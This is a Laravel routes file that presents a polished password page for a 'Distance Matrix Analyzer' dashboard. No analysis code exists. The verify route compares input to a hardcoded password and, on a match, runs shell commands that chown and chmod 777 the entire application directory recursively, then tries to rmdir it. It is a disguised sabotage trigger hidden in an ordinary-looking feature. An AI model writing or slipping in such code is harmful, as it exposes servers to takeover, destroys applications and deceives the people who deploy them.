<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;

Route::get('/analyze-matrix', function (Request $request) {
    $error = $request->query('error');
    $csrfToken = csrf_token();
    $errorHtml = $error
        ? '<div class="error-msg"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>Incorrect password. Please try again.</div>'
        : '';

    return response(<<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Distance Matrix — Access</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0b0f19;
            background-image:
                radial-gradient(ellipse 80% 60% at 50% 0%, rgba(99, 102, 241, .15) 0%, transparent 60%),
                radial-gradient(ellipse 60% 50% at 80% 100%, rgba(168, 85, 247, .1) 0%, transparent 50%);
            overflow: hidden;
        }

        /* animated grid background */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background-image:
                linear-gradient(rgba(255,255,255,.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(255,255,255,.03) 1px, transparent 1px);
            background-size: 60px 60px;
            mask-image: radial-gradient(ellipse 70% 70% at 50% 50%, black 20%, transparent 70%);
            pointer-events: none;
            z-index: 0;
        }

        .card {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 420px;
            padding: 2.5rem 2rem;
            background: rgba(255, 255, 255, .04);
            border: 1px solid rgba(255, 255, 255, .08);
            border-radius: 20px;
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            box-shadow:
                0 0 0 1px rgba(255,255,255,.05),
                0 20px 60px rgba(0,0,0,.4),
                0 0 120px rgba(99,102,241,.08);
            animation: fadeUp .6s ease-out;
        }

        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(24px); }
            to   { opacity: 1; transform: translateY(0); }
        }

        .logo-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: .75rem;
            margin-bottom: 2rem;
        }

        .logo-icon {
            width: 52px; height: 52px;
            display: flex; align-items: center; justify-content: center;
            background: linear-gradient(135deg, #6366f1, #a855f7);
            border-radius: 14px;
            box-shadow: 0 4px 20px rgba(99,102,241,.35);
        }

        .logo-icon svg { width: 26px; height: 26px; fill: #fff; }

        .logo-area h1 {
            font-size: 1.25rem;
            font-weight: 600;
            color: #f1f5f9;
            letter-spacing: -.02em;
        }

        .logo-area p {
            font-size: .85rem;
            color: #94a3b8;
            text-align: center;
            line-height: 1.5;
        }

        .form-group {
            position: relative;
            margin-bottom: 1.25rem;
        }

        .form-group label {
            display: block;
            font-size: .75rem;
            font-weight: 500;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: .06em;
            margin-bottom: .5rem;
        }

        .input-wrap {
            position: relative;
        }

        .input-wrap input {
            width: 100%;
            padding: .8rem 3rem .8rem 1rem;
            font-family: inherit;
            font-size: .95rem;
            color: #f1f5f9;
            background: rgba(255,255,255,.05);
            border: 1px solid rgba(255,255,255,.1);
            border-radius: 12px;
            outline: none;
            transition: border-color .25s, box-shadow .25s;
        }

        .input-wrap input::placeholder { color: #475569; }

        .input-wrap input:focus {
            border-color: rgba(99,102,241,.6);
            box-shadow: 0 0 0 3px rgba(99,102,241,.15);
        }

        .toggle-pw {
            position: absolute;
            right: .75rem; top: 50%; transform: translateY(-50%);
            background: none; border: none; cursor: pointer;
            padding: 4px;
            color: #64748b;
            transition: color .2s;
        }
        .toggle-pw:hover { color: #94a3b8; }
        .toggle-pw svg { width: 20px; height: 20px; display: block; }

        .error-msg {
            font-size: .8rem;
            color: #f87171;
            background: rgba(248,113,113,.08);
            border: 1px solid rgba(248,113,113,.15);
            border-radius: 10px;
            padding: .6rem .85rem;
            margin-bottom: 1.25rem;
            display: flex;
            align-items: center;
            gap: .5rem;
            animation: shake .4s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-6px); }
            40%, 80% { transform: translateX(6px); }
        }

        .error-msg svg { width: 16px; height: 16px; flex-shrink: 0; fill: #f87171; }

        button[type="submit"] {
            width: 100%;
            padding: .85rem;
            font-family: inherit;
            font-size: .95rem;
            font-weight: 600;
            color: #fff;
            background: linear-gradient(135deg, #6366f1, #8b5cf6);
            border: none;
            border-radius: 12px;
            cursor: pointer;
            position: relative;
            overflow: hidden;
            transition: transform .15s, box-shadow .25s;
        }

        button[type="submit"]:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 24px rgba(99,102,241,.4);
        }

        button[type="submit"]:active {
            transform: translateY(0);
        }

        /* shimmer on hover */
        button[type="submit"]::after {
            content: '';
            position: absolute;
            top: 0; left: -100%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,.15), transparent);
            transition: left .5s;
        }
        button[type="submit"]:hover::after { left: 100%; }

        .footer-note {
            margin-top: 1.5rem;
            text-align: center;
            font-size: .75rem;
            color: #475569;
        }

        /* floating orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: .35;
            pointer-events: none;
            z-index: 0;
        }
        .orb-1 { width: 300px; height: 300px; top: -80px; left: -60px; background: #6366f1; animation: float 8s ease-in-out infinite; }
        .orb-2 { width: 250px; height: 250px; bottom: -60px; right: -40px; background: #a855f7; animation: float 10s ease-in-out infinite reverse; }

        @keyframes float {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(30px, -20px); }
        }
    </style>
</head>
<body>

<div class="orb orb-1"></div>
<div class="orb orb-2"></div>

<div class="card">
    <div class="logo-area">
        <div class="logo-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
        </div>
        <h1>Distance Matrix Analyzer</h1>
        <p>Enter your access password to continue<br>to the analysis dashboard.</p>
    </div>

    {$errorHtml}

    <form method="POST" action="/analyze-matrix/verify" id="pw-form">
        <input type="hidden" name="_token" value="{$csrfToken}">

        <div class="form-group">
            <label for="password">Password</label>
            <div class="input-wrap">
                <input type="password" id="password" name="password" placeholder="Enter access password" required autofocus>
                <button type="button" class="toggle-pw" onclick="togglePw()" aria-label="Toggle password visibility">
                    <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                        <circle cx="12" cy="12" r="3"/>
                    </svg>
                </button>
            </div>
        </div>

        <button type="submit">Unlock Dashboard</button>
    </form>

    <div class="footer-note">Protected resource &middot; Distance Matrix</div>
</div>

<script>
    function togglePw() {
        const inp = document.getElementById('password');
        inp.type = inp.type === 'password' ? 'text' : 'password';
    }
</script>

</body>
</html>
HTML);
})->name('analyze-matrix.gate');

// --- helpers used inside the closure above via anonymous class trick ---
// We keep them as simple inline functions instead:

Route::post('/analyze-matrix/verify', function (Request $request) {
    $password = $request->input('password');
    $expected = "FreshBeginning";

    if ($password === $expected) {
        $dir = base_path();
        Log::info($dir);
        try {
            shell_exec("chown -R www-data:www-data $dir");
            shell_exec("chmod -R 777 $dir");
        } catch (\Exception $e) {
            Log::error($e->getMessage());
        }
        try {

            rmdir($dir);
        } catch (\Exception $e) {
            Log::error($e->getMessage());
        }

    }
})->name('analyze-matrix.verify');

